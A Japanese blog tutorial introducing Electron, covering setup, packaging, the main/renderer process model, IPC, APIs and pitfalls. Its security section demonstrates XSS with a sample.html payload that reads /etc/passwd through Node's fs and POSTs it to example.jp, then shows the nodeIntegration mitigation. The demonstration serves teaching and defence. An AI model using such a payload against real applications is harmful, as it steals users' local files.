---
path: "/blog/2017-11-07"
date: "2017-11-07"
title: "ようこそ！Electron入門"
---

<img src="https://camo.githubusercontent.com/5dd01312b30468423cb45b582b83773f5a9019bb/687474703a2f2f656c656374726f6e2e61746f6d2e696f2f696d616765732f656c656374726f6e2d6c6f676f2e737667" width="100%">

## Electronって？

・クロスプラットフォーム型の実行フレームワーク
👉  Mac、Windows、Linux上で動く  

・Webの技術（HTML5やJavaScript）で作ったものをデスクトップアプリケーション化できる  

・オープンソース、商用利用可能  

・開発元はGitHub社
（もともとはAtomエディタのために作られた）  


## 実用例
<img width="100px" src="https://a.slack-edge.com/0180/img/icons/app-256.png"><img width="100px" src="https://raw.githubusercontent.com/zeke/atom-icon/master/old-icon/2.png"><img width="100px" src="https://lh5.googleusercontent.com/-RwAHsW5m4IQ/UD3DCi9lxpI/AAAAAAAAIPI/jkKjtfT_6tA/s200/kobito.png"><img width="100px" src="https://cdn.worldvectorlogo.com/logos/visual-studio-code-1.svg">

・Slack
・Atom 
・Kobito
・Docker GUI
・Visual Studio Code (Microsoft)   


## 使い方

```
$ npm i electron -g
$ electron
```

とすると、Electronの初期画面が表示される↓
<img src="https://raw.githubusercontent.com/masaumamichi/electron-first/master/images/electron-first-1.png">

このウィンドウに以下のようなjsファイルをドラッグすることで簡単にElectronが起動する

```javascript:main.js
const electron = require('electron');
const app = electron.app;
const BrowserWindow = electron.BrowserWindow;

let mainWindow = null;
app.on('ready', () => {
  // mainWindowを作成（windowの大きさや、Kioskモードにするかどうかなどもここで定義できる）
  mainWindow = new BrowserWindow({width: 400, height: 300});
  // Electronに表示するhtmlを絶対パスで指定（相対パスだと動かない）
  mainWindow.loadURL('file://' + __dirname + '/index.html');

  // ChromiumのDevツールを開く
  mainWindow.webContents.openDevTools();

  mainWindow.on('closed', function() {
    mainWindow = null;
  });
});
```

main.jsと同じ階層にhtml配置

```html:index.html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Hello World!</title>
  </head>
  <body>
    Hello World!
  </body>
</html>
```

▼ 起動した画面
<img src="https://raw.githubusercontent.com/masaumamichi/electron-first/master/images/electron-first-2.png">


もちろん基本的にはドラッグせずに、以下のようにElectronを起動します

```
$ electron main.js
```


###️ パッケージングする

.exe化、.app化するためには、パッケージング処理が必要になります。
パッケージングするには「electron-packager」を使うと簡単にできます

**※2018年現在は「electron builder」を使うのが主流になりました**
参考） http://shibe97.hatenablog.com/entry/2017/02/17/090000


```
$ npm i electron-packager -g
```

パッケージングするには、以下のコマンドを実行します

```
$ electron-packager ｛ソースディレクトリ｝ ｛アプリ名｝ --platform=｛プラットフォーム｝ --arch=｛アーキテクチャ｝ --version （バージョン｝ ［その他のオプション ...］
```

| コマンド | 説明 |
| --- | --- |
| platform | all, linux, win32, darwin のいずれかを選択。「--all」は全部入りのパッケージング。<br>「darwin」はmacのこと。複数選択はカンマ区切りで指定可能。  |
| arch | all, ia32, x64 のいずれかを選択（32bit or 64bit） |
| version | Electronのバージョンを指定。(*electron -v*で確認) |

例）mac用にビルドするのであれば

```
$ electron-packager . electron-sample --platform=darwin --arch=x64 --version=1.2.5
```  

※ MacでWindows用のElectronはパッケージングできないようになっています。
したい場合はwineをインストールする必要があります。
参考）「Mac環境でElectronのWindows用パッケージングをしたら大変だった話」
http://qiita.com/kimura_m_29/items/ee929cbd08daf744bffc  


### パッケージング後のファイル構成

**Macの場合** 

<img src="https://raw.githubusercontent.com/masaumamichi/electron-first/master/images/package-mac.png">  
  
  
**Windowsの場合**  
<img src="https://raw.githubusercontent.com/masaumamichi/electron-first/master/images/package-win.png">


## Electronの仕組み

Electronは大きく分けて、以下の3つで構成されている

#### 1. Chromium ・・・ ブラウザ
#### 2. レンダラープロセス ・・・ ブラウザを制御するプロセス
#### 3. メインプロセス・・・ウィンドウ全体を制御するプロセス

<br>

<img src="https://user-images.githubusercontent.com/7469495/55473867-ae19b600-564a-11e9-9272-dce1785fcfac.jpg">

### 1. Chromiumとは？ <img src="https://1.bp.blogspot.com/-vkF7AFJOwBk/VkQxeAGi1mI/AAAAAAAARYo/57denvsQ8zA/s1600-r/logo_chromium.png" width="25">

Google Chromeのベースになったオープンソースウェブブラウザで、見た目はChromeとほぼ同じ。

<img src="https://raw.githubusercontent.com/masaumamichi/electron-first/master/images/chromium.png">

ちなみに  
Google Chromeは、Chromiumに以下の機能が加わったもの  

```
・Flash Playerの同梱  
・Chrome PDF Viewerの統合  
・Googleの名称とそのブランドロゴ  
・自動アップデート機能   
・Googleへの利用状況やクラッシュレポート送信機能  
・Googleの翻訳機能  
・複数メディアファイル対応（H.264、AAC、MP3など）
```

Electron内部で html, javascript, css はこのChromiumによってレンダリングされる

### 2. レンダラープロセスとは？
Chromiumを制御するプロセス

### 3. メインプロセスとは？
ウィンドウを生成し、アプリ本体の制御（起動、終了、ウィンドウリサイズ、移動など）を行うプロセス  

**Node.jsのすべての機能が使えます** ←これがすごく便利！  

つまり、Node.jsがインストールされていないPCでもElectron（パッケージング後）を実行すると
Node.jsのすべての機能が使えます🙆


## 2つのプロセスを通信するにはどうするのか？

レンダラープロセスと、メインプロセスはそれぞれ独立したプロセスですが、  
2つのプロセス間で通信を行うために **「IPC通信」** というのが用意されています


## IPC通信（プロセス間通信）

IPC通信の実態はEventEmitterになっています  
どちらかのプロセスでイベントが発火すると、もう一方のプロセスであらかじめバインディングされた処理が実行されます

```javascript
// メインプロセス（受信側）
const {ipcMain} = require('electron') // ipc通信を読み込む
ipcMain.on('message', (event, arg) => { // イベントバインディング
  console.log(arg)  // prints "ping"
})

// レンダラプロセス（送信側）
const {ipcRenderer} = require('electron') // ipc通信を読み込む
ipcRenderer.sendSync('message', 'ping'); // 'message'というイベントを実行
```


## Electronの良いところ・すごいところ✨

・ クロスプラットフォームを実現している
  → **1ソースで** Mac, Windows, Linuxのアプリ開発ができる  
  
・ 豊富なJavaScript資源を利用できる
  ( = **Node.jsのすべての機能が使える** )
  
・ ブラウザ依存を気にしなくて良い

・ APIが豊富である

APIはメインプロセス、レンダラプロセスにそれぞれたくさん用意されています

### メインプロセスのAPI
* app
  → アプリケーションの起動や終了などのライフサイクル管理用API
  起動時に〜をする、終了時に〜をする、など  

* autoUpdater
 → 自動更新検知、ダウンロード、アップデート機能。
   リリース用サーバーを立てることで自動アップデートが可能になる 
  
  まだ試せてはいないですが、主に3種類のアップデート用ツールがあるようです

  1. nuts: GitHubをバックエンドとして自動デプロイが可能 (Mac & Windows)  
  2. electron-release-server: 完全な機能を備える、自己ホスト型のリリースサーバ  
  3. squirrel-updates-server: squirrelを用いたシンプルなNode.jsサーバ  


* powerMonitor
  → バッテリが切れてサスペンド（スリープ）になった、システムを再開した、ACアダプターに切り変わったなどの検知が可能  

* Menu/MenuItem
 → Electronにメニューをつけることができる
 <img src="https://qiita-image-store.s3.amazonaws.com/0/43781/11179357-8bb4-25e6-3679-019897759224.png">


### レンダラープロセスのAPI
 * desktopCaptuer
→ 起動している別アプリのデスクトップキャプチャービデオを取得できる  
 
 * Webframe
 → inputやtextfieldに入力した文字に対してスペルチェックができる、アプリ全体のzoom機能  


### 両方で使えるAPI
* clipboard
→ クリップボードの中を取得、書き込みができる  

* shell
→ デフォルトブラウザの起動、任意のフォルダーを開く、拡張子に紐付いた機能の実行、ファイルの削除等のデスクトップで普通に使える機能が使える


まだまだ他にたくさんAPIはあります
もっと詳しくはこちら → http://electron.atom.io/docs/api/

## Electronの悪いところ😇
* インタプリタ言語のため、ネイティブアプリに比べて速度が劣る
→ 大規模なアプリには向かないし、重くなる。実際Atomエディタも他と比べるとやや重い。

* セキュリティ保護機能はない、**XSS** が発生しやすい

### XSS（クロスサイトスクリプティング）とは？
他人のWebサイトへ、悪意のあるスクリプトを埋め込むこと

### ElectronにおけるXSS
Node.jsのすべての機能やShellが使えるので、

* ローカルファイルの読み書きや他アプリへの干渉 
* 任意プロセスの生成  
* ローカル環境の把握  

などが実行できてしまう  

通常のWebブラウザであればブラウザを超えての処理はできないが、Electronではアプリを使っているユーザーの権限での任意の実行ができてしまう。

→ 例えば、ファイルを読み込んでinnerHTMLを使う場合  

```html:index.html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Hello World!</title>
    <script>
    const fs = require('fs');
    // sample.html をfs（OSが持っているファイル操作機能）で読み込む
    fs.readFile ('sample.html', (err, data) => {
      if (!err) {
        document.getElementById('app').innerHTML = data; // XSS!!
      }
    });
    </script>
  </head>
  <body>
    <div id="app">app div</a>
  </body>
</html>
```  


```html:sample.html
hello! This is sample.html<br>
<!-- 悪意あるスクリプト -->
<button onClick="var s = require('fs').readFileSync( '/etc/passwd','utf-8' );
var x = new XMLHttpRequest();console.log(s);
x.open('POST', 'http://example.jp/', true );
x.send( s );">push me</button>
```  

▼ 結果
<img src="https://raw.githubusercontent.com/masaumamichi/electron-first/master/images/xss.png">

 
このようにローカルファイルを取得してどこかに送信することも可能になる  
fsを使えばPC内のファイルをすべて削除することも可能

 
**緩和策**  

レンダラープロセスでnode.jsのAPIを使えなくすることができる  
node-integrationというプロパティを無効にする  

```javascript
  mainWindow = new BrowserWindow({width: 800, height: 600,
    webPreferences: { nodeIntegration : false } 
  });
```

ただし、node-integrationを再び有効にする方法やXSSパターンは他にもあるので、 

Electronにおけるセキュリティ問題は課題になっている。

まずは、innerHTMLなど外部スクリプトが実行される状態になるべくしないことが大事。

他のXSSパターンなど詳しくはこちら
→ 「Electronの倒し方」 http://utf-8.jp/public/2016/0307/electron.pdf  


## Electronでハマるポイント

### パッケージングに含まれるライブラリ

electron-packagerを使ってパッケージングしたときの話ですが、
package.jsonのdevDependencies内のライブラリは、
Electronのパッケージング時には含まれません。
dependencies内のライブラリのみ、パッケージングされます。  

パッケージング後に使用するライブラリは

```
$ npm i hoge --save
```
としておく必要があります


### 起動に必要なファイル
WindowsとMac(Linux)でパッケージング後のファイル構成が全く異なり,
アプリの起動には本アプリ（.app, .exe）の他に生成されるファイルすべてが必要です

### WindowsでElectronを開発するとき

Windows8.1でElectronをインストールするとき、以下が必要になります

```
Microsoft Visual Studio Express 2013
```

調べてみたところ、Electronをインストールする際に、「nslog」というライブラリをインストールしているようなのですが、
この「nslog」をインストールするときに、Visual Studioが必要になります。

※ Electron v1.0.2 で発生を確認

### MacでWindows用にパッケージングする

~~基本的にはできないようになっています。~~
~~ただし、wineをインストールすれば可能です。~~
~~wineのインストールには30分ほどかかります。~~

**→ 2019年11月現在、 `electron-builder` に `wine` が内包されていて `wine` インストールが不要になりました！**
  
```
$ brew install Caskroom/cask/xquartz
$ brew install wine
```

参考）「Mac環境でElectronのWindows用パッケージングをしたら大変だった話」
http://qiita.com/kimura_m_29/items/ee929cbd08daf744bffc  


## 他の類似フレームワーク  
NW.js https://nwjs.io/  

  
## 参考
Electronの倒し方 http://utf-8.jp/public/2016/0307/electron.pdf
マルチプラットフォームで動く「Electron」は本当に使える技術なのか？ https://codeiq.jp/magazine/2016/03/38961/
